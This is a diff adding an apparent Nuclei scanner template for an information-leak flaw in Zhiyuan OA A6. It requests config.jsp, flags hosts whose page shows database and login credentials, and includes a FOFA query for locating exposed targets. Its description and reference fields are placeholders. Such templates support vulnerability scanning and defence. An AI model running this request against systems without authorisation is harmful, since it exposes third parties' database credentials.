@@ -1,0 +1,35 @@
+id: ZhiyuanOA-A6-config-InformationLeakage
+
+info:
+  name: 致远OA-A6-config.jsp-敏感信息泄漏漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata: 
+    fofa-query: body="yyoa" && app="致远互联-OA"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /yyoa/ext/trafaxserver/SystemManage/config.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '数据库用户名'
+          - '数据库密码'
+          - '登录用户名'
+      - type: status
+        status:
+          - 200
